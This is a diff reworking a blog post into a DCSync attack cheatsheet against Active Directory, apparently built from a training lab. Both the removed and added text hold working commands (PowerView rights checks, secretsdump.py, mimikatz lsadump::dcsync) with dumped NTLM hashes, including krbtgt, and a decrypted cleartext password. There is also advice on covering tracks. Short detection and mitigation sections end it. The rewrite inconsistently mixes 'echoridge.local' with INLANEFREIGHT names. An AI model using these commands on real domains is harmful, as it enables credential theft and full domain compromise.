@@ -1,5 +1,5 @@
 ---
-title: On  Performing a DCSync Attack 
+title: "Achieving Domain Compromise via the DCSync Technique [CHEATSHEET]" 
 date: 2025-03-26 20:27:02
 tags:
 - dcsync
@@ -7,29 +7,26 @@ tags:
 - Active Directory
 - Lateral Movement
 - mimikatz
-description: "DCSync is a technique for stealing the Active Directory password database by using the  built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes."
+description: "DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes."
 ---
-![alt text](../images/dcysnc23.png)
 
-# _Overview
+# Overview
 DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
 <!-- more --> 
 The core of the attack involves exploiting the DS-Replication-Get-Changes-All extended right to prompt a Domain Controller to replicate password data. This specific Active Directory permission grants access to replicate sensitive, secret information across the domain.
 
-![alt text](../images/REPACE.png)
+![Directory Replication Service Remote Protocol exploitation diagram](../images/REPACE.png)
 
 ---
 
-### Checking user Groups, SID, ACLs
+## Prerequisites: Checking Replication Rights
 
-PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.
+PowerView can be used to confirm that a user has the necessary replication permissions assigned to their account.
 
-We first get the user's SID in the above command and then check all ACLs set on the domain object (`"DC=inlanefreight,DC=local"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights. The command confirms that the user does indeed have the rights.
-Checking for Replication--Get ACE
-```
+```powershell
 $sid = "{sid-here}"
 
-PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
 
 
 AceQualifier          : AccessAllowed
@@ -43,23 +40,20 @@ ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
 ActiveDirectoryRights : ExtendedRight
 SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
 ObjectAceType         : DS-Replication-Get-Changes
-
-AceQualifier          : AccessAllowed
-ObjectDN
 ```
-If we had certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.
 
+If we had certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.
 
-### exploit  replication ACE to perform DCsync
-#### (impacket) secretsdump.py
-Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+---
 
- Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
+## Exploitation
 
-```shell-session
-linux-attack$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+### Using secretsdump.py (Linux)
 
-pass:
+Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+
+```shell
+$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
 
 [*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
 [*] Searching for NTDS.dit
@@ -69,430 +63,134 @@ pass:
 [*] Searching for pekList, be patient
 [*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
 [*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
-inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+echoridge.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
 guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
-ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
-ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
-ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
-inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
-inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
 ```
-We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:
 
-- Number and % of passwords cracked
-- top 10 passwords
-- Password length metrics
-- Password re-use
-#### mimikatz
-```title:mimikatz
-runas /netonly /user:domain<ilfreight\{high-priv-user}tpetty powershell {requires pass}
+**Useful flags:**
+- `-just-dc-ntlm` - Only extract NTLM hashes
+- `-just-dc-user <USERNAME>` - Extract data for a specific user only
+- `-pwd-last-set` - Show when each account's password was last changed
+- `-history` - Dump password history
+- `-user-status` - Check if a user is disabled
 
+---
+
+### Using Mimikatz (Windows)
+
+Mimikatz must be run in the context of the user who has DCSync privileges. Use `runas.exe` to accomplish this:
+
+```cmd
+C:\> runas /netonly /user:INLANEFREIGHT\adunn powershell
+Enter the password for INLANEFREIGHT\adunn:
+Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
+```
+
+From the newly spawned powershell session, perform the attack:
+
+```powershell
+PS C:\> .\mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::dcsync /domain:echoridge.local /user:INLANEFREIGHT\administrator
+[DC] 'echoridge.local' will be the domain
+[DC] 'ACADEMY-EA-DC01.echoridge.local' will be the DC server
+[DC] 'INLANEFREIGHT\administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : administrator
+User Principal Name  : administrator@echoridge.local
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Password last change : 10/27/2021 6:49:32 AM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
+```
+
+**Note:** `sekurlsa::logonpasswords` for credentials in memory doesn't work past Server 2012.
+
+---
+
+### Targeted DCSync
+
+Retrieve user SID and check permissions by providing samAccountName:
+```powershell
+$SID = Convert-Name-TO-SID <name>
+get-domainobjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $SID}
+```
+
+Run mimikatz and dump NTLM Hash for the target user:
+```
 ./mimikatz.exe
-
-# lsadump::dcsync /domain:{} /user:{domain\targetuser} 
+lsadump::dcsync /domain:{} /user:{domain\targetuser} 
 ```
 
-#### Viewing an Account with Reversible Encryption Password Storage Set
+---
 
-![image](https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)
+## Reversible Encryption Passwords
 
-When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. 
-The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.
+When the "Store password using reversible encryption" option is set on a user account, passwords are stored using RC4 encryption (not cleartext). The key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin.
 
-If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:
+Tools like `secretsdump.py` will automatically decrypt any passwords stored using reversible encryption while dumping the NTDS file.
 
-#### Enumerating Further using Get-ADUser
+### Enumerate Accounts with Reversible Encryption
 
-  DCSync
-
-```powershell-session
-PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+Using Get-ADUser:
+```powershell
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 
 DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
 Enabled            : True
-GivenName          :
 Name               : PROXYAGENT
-ObjectClass        : user
-ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
 SamAccountName     : proxyagent
-SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
-Surname            :
 userAccountControl : 640
-UserPrincipalName  :
 ```
 
-We can see that one account, `proxyagent`, has the reversible encryption option set with PowerView as well:
-
-#### Checking for Reversible Encryption Option using Get-DomainUser
-
-  DCSync
-
-```powershell-session
-PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+Using PowerView:
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
 
 samaccountname                         useraccountcontrol
 --------------                         ------------------
 proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
 ```
 
-We will notice the tool decrypted the password and provided us with the cleartext value.
+### Viewing Decrypted Passwords
 
-#### Displaying the Decrypted Password
-
-  DCSync
-
-```shell-session
-magdy3660@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
+The tool will decrypt the password and provide the cleartext value:
+```shell
+$ cat inlanefreight_hashes.ntds.cleartext 
 
 proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
 ```
 
-I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.
-
-We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.
-
-Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:
-
-#### Using runas.exe
-
-```cmd-session
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
-Enter the password for INLANEFREIGHT\adunn:
-Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
-```
-
-From the newly spawned powershell session, we can perform the attack:
-
-#### Performing the Attack with Mimikatz
-
-```powershell-session
-PS C:\htb> .\mimikatz.exe
-
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
-
-mimikatz # privilege::debug
-Privilege '20' OK
-=================================================================
-mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
-[DC] 'INLANEFREIGHT.LOCAL' will be the domain
-[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
-[DC] 'INLANEFREIGHT\administrator' will be the user account
-[rpc] Service  : ldap
-[rpc] AuthnSvc : GSS_NEGOTIATE (9)
-
-Object RDN           : Administrator
-
-** SAM ACCOUNT **
-
-SAM Username         : administrator
-User Principal Name  : administrator@inlanefreight.local
-Account Type         : 30000000 ( USER_OBJECT )
-User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
-Account expiration   :
-Password last change : 10/27/2021 6:49:32 AM
-Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
-Object Relative ID   : 500
-
-Credentials:
-  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
-
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : 4625fd0c31368ff4c255a3b876eaac3d
-
-<SNIP>
-```
-
-
-Credentails in memory -> doesnt work past server 2012
-```
-sekurlsa::logonpasswords
-```
-
-
-`requires sereplication privilege, check for that acl type`
-```
-$SID = Convert-Name-TO-SID <name>
-get-domainobjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $SID}
-```
-
-#dcsyncing
-```
-./mimikatz.exe
-
-# lsadump::dcsync /domain:{} /user:{domain\targetuser} 
-
-```
-
-# dcsync linux
-```
- secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3
-```
-
-
-
-
-
-        
-
-
-
-
-
-
-
-
-
-
-
 ---
 
-## Account Enumeration
-```powershell-session
-PS> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
-```
-
-### Checking user Groups, SID, ACLs
-
-PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account.
-
-We first get the user's SID in the above command and then check all ACLs set on the domain object (`"DC=inlanefreight,DC=local"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights. The command confirms that the user does indeed have the rights.
-Checking for Replication--Get ACE
-```
-$sid = "{sid-here}"
-
-PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
-
-
-AceQualifier          : AccessAllowed
-ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
-ActiveDirectoryRights : ExtendedRight
-SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
-ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
-
-AceQualifier          : AccessAllowed
-ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
-ActiveDirectoryRights : ExtendedRight
-SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
-ObjectAceType         : DS-Replication-Get-Changes
-
-AceQualifier          : AccessAllowed
-ObjectDN
-```
-If we had certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.
-
-
-### exploit  replication ACE to perform DCsync
-#### (impacket) secretsdump.py
-Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
-
- Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
-
-```shell-session
-linux-attack$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
-
-pass:
-
-[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
-[*] Searching for NTDS.dit
-[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
-[*] Using smbexec method for remote execution
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Searching for pekList, be patient
-[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
-[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
-inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
-guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
-ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
-ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
-ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
-inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
-inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
-```
-We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:
-
-- Number and % of passwords cracked
-- top 10 passwords
-- Password length metrics
-- Password re-use
-#### mimikatz
-```title:mimikatz
-runas /netonly /user:domain<ilfreight\{high-priv-user}tpetty powershell {requires pass}
-
-./mimikatz.exe
-
-# lsadump::dcsync /domain:{} /user:{domain\targetuser} 
-```
-
-#### Viewing an Account with Reversible Encryption Password Storage Set
-
-![image](https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)
-
-When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. 
-The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. 
-
-Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. 
-Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:
-
-#### Enumerating Further
-
-
-```powershell
-PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
-
-DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
-Enabled            : True
-GivenName          :
-Name               : PROXYAGENT
-ObjectClass        : user
-ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
-SamAccountName     : proxyagent
-SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
-Surname            :
-userAccountControl : 640
-UserPrincipalName  :
-```
-## Reversible Encryption
-Reversible encryption is a method of storing passwords in a way that they can be decrypted back into their original plain text form.
-
-Instead of hashing a password (which is one-way), reversible encryption encrypts it in a two-way format — it can be both encrypted and decrypted.
-
-This is not secure and is generally discouraged because if an attacker gains access to the encrypted passwords, they can easily retrieve the plain-text versions.
-![alt text](../images/reversible-encryp.png)
-
-
-We can see that one account, `proxyagent`, has the reversible encryption option set with PowerView
-
-
-### Enumerating Reversible Encryption Option using PowerView
-
-```powershell-session
-PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
-
-samaccountname                         useraccountcontrol
---------------                         ------------------
-proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
-```
-
-We will notice the tool decrypted the password and provided us with the cleartext value.
-
-Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize`runas.exe` to accomplish this:
-
-#### Using runas.exe
-
-```cmd-session
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
-Enter the password for INLANEFREIGHT\adunn:
-Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
-```
-
-From the newly spawned powershell session, we can perform the attack:
-
-#### DCSyncing
-
-```powershell
-PS C:\htb> .\mimikatz.exe
-
-  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
-
-mimikatz # privilege::debug
-Privilege '20' OK
-=================================================================
-mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
-[DC] 'INLANEFREIGHT.LOCAL' will be the domain
-[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
-[DC] 'INLANEFREIGHT\administrator' will be the user account
-[rpc] Service  : ldap
-[rpc] AuthnSvc : GSS_NEGOTIATE (9)
-
-Object RDN           : Administrator
-
-** SAM ACCOUNT **
-
-SAM Username         : administrator
-User Principal Name  : administrator@inlanefreight.local
-Account Type         : 30000000 ( USER_OBJECT )
-User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
-Account expiration   :
-Password last change : 10/27/2021 6:49:32 AM
-Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
-Object Relative ID   : 500
-
-Credentials:
-  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
-
-Supplemental Credentials:
-* Primary:NTLM-Strong-NTOWF *
-    Random Value : 4625fd0c31368ff4c255a3b876eaac3d
-
-<SNIP>
-```
-
-
-Credentails in memory -> doesnt work past server 2012
-```
-sekurlsa::logonpasswords
-```
-
-
-`requires sereplication privilege, check for that acl type`
-```
-$SID = Convert-Name-TO-SID <name>
-get-domainobjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $SID}
-```
-
-#dcsyncing
-```
-./mimikatz.exe
-
-# lsadump::dcsync /domain:{} /user:{domain\targetuser} 
-
-```
-
-# dcsync linux
-```
- secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/tpetty@172.16.6.3
-```
-
 ## Detection
-To detect DCSync activity, you can monitor the TargetLogonId from Event 4624 and correlate it with other security events tied to the same logon session. DCSync generates a Network Logon type (3) on the DC. By linking Event 4662 (which tracks directory access) with Event 4624 using the LogonId, defenders can identify the source IP of the DCSync request.
 
-![alt text](../images/imasasage.png)
+To detect DCSync activity, monitor the TargetLogonId from Event 4624 and correlate it with other security events tied to the same logon session. DCSync generates a Network Logon type (3) on the DC. By linking Event 4662 (which tracks directory access) with Event 4624 using the LogonId, defenders can identify the source IP of the DCSync request.
+
+![DCSync detection using Event 4624 and 4662 correlation](../images/imasasage.png)
 
 
 ## Mitigations
-DCSync attacks exploit replication permissions in Active Directory to extract sensitive credentials, including password hashes. To mitigate this, you must reduce unnecessary replication rights, protect high-privilege accounts, monitor for suspicious activity, and harden your domain infrastructure.
 
-Mitigation Steps:
+DCSync attacks exploit replication permissions in Active Directory to extract sensitive credentials. To mitigate:
 
-Limit replication rights
-Only Domain Controllers and essential admin accounts should have replication privileges. Audit and remove unnecessary permissions.
+1. **Limit replication rights** - Only Domain Controllers and essential admin accounts should have replication privileges. Audit and remove unnecessary permissions.
 
-Monitor for DCSync behavior
-Detect suspicious replication attempts by monitoring security logs and using threat detection tools.
+2. **Monitor for DCSync behavior** - Detect suspicious replication attempts by monitoring security logs and using threat detection tools.
 
-Protect privileged accounts
-Restrict and monitor Domain Admins. Use tiered admin models and Protected Users group where possible.
+3. **Protect privileged accounts** - Restrict and monitor Domain Admins. Use tiered admin models and Protected Users group where possible.
 
-Regularly audit privileged access
-Frequently review permissions and group memberships. Remove outdated accounts and rotate credentials.
+4. **Regularly audit privileged access** - Frequently review permissions and group memberships. Remove outdated accounts and rotate credentials.
